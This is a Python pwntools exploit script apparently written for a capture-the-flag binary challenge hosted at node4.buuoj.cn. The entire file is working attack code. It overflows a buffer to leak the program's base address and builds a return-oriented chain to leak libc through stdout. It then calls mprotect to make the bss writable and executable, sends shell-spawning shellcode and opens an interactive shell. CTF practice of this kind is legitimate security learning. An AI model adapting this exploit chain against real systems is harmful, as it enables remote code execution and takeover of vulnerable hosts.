#!/usr/bin/env python3
#coding:utf-8

from pwn import *

#--------------------prepare------------------------
binary = './pwn_fixed'
libc_so = ""
host = "node4.buuoj.cn"
port = 10001
#---------------------------------------------------
elf = ELF(binary, checksec=True)
libc = ELF(libc_so, checksec=False) if libc_so and not elf.got else (not elf.got or elf.libc)
context(arch = elf.arch, os = 'linux')
if args.G:
    context.log_level = 'debug'
p = remote(host, port) if args.R else process(binary)

def attach(msg = ''):
    if args.R:return
    context(terminal=["tmux","splitw","-v"])
    gdb.attach(p, gdbscript=msg)
    dbg('go to gdb')
#---------------------short command-------------------
dbg = lambda msg='debug': info(f'[*]{msg}') if args.R else input(f"pid: {pidof(p)[0]} =>{msg}")
checkstr = lambda data:data if isinstance(data, bytes) else data.encode()
sl = lambda data: p.sendline(checkstr(data))
sd = lambda data: p.send(checkstr(data))
sa = lambda delimit, data: p.sendafter(checkstr(delimit), checkstr(data))
sla = lambda delimit, data: p.sendlineafter(checkstr(delimit), checkstr(data))
ru = lambda delimit, *args, **kwargs: p.recvuntil(checkstr(delimit), *args, **kwargs)
rl = lambda : p.recvline()
ra = lambda timeout=10 : p.recvall(timeout=timeout)
rcn = lambda number=4096,*args, **kwargs: p.recv(number,*args, **kwargs)
ss = lambda delimit, data: success(f'{delimit}: {data:#x}')
uu64 = lambda data:u64(checkstr(data).ljust(8, p8(0)))
uu32 = lambda data:u32(checkstr(data).ljust(4, p8(0)))
str_bin_sh = 0 if not elf.got else next(libc.search(b'/bin/sh\x00'))
#---------------------PWN SPACE----------------------

#-----------leak codebase----------------
sd("a"*0x20)
ru('a'*0x20)
main_addr = uu64(rcn(6))
codebase = main_addr - elf.sym.main
vuln_func = codebase +0x1217
ss('main_address', main_addr)
ss('code base', codebase)

binsh_str = codebase + 0x2004
system_addr= codebase + 0x10A0

bss_addr = codebase + 0x4020
p_rbp_ret = codebase + 0x1193# pop rbp; ret;

#--------------------leak libc------------
payload = flat({
    0x38: [p_rbp_ret, bss_addr + 0x30, vuln_func]
})

sd(payload)
stdout = uu64(ru(p8(0x7f))[-6:])
libc_base = stdout - libc.sym._IO_2_1_stdout_
mprotect = libc_base + libc.sym.mprotect

ss('stdout address', stdout)
ss('libcbase', libc_base)
ss('mprotect', mprotect)

p_rdi_ret = libc_base + next(libc.search(asm('pop rdi\nret')))
p_rsi_ret = libc_base + next(libc.search(asm('pop rsi\nret')))
p_rdx_ret = libc_base + 0x5f65a#pop rdx; ret
ss('pop rdi ret', p_rdi_ret)
ss('pop rsi ret', p_rsi_ret)
ss('pop rdx ret', p_rdx_ret)

shellcode = asm(shellcraft.sh())
payload = flat({
    0x0: shellcode,
    0x38:[p_rdi_ret, codebase+0x4000, p_rsi_ret, 0x1000, p_rdx_ret, 0x7, mprotect, bss_addr]
}, filler = p8(0))

sd(payload)
#--------INTERACTIVE----------------------------
p.interactive()
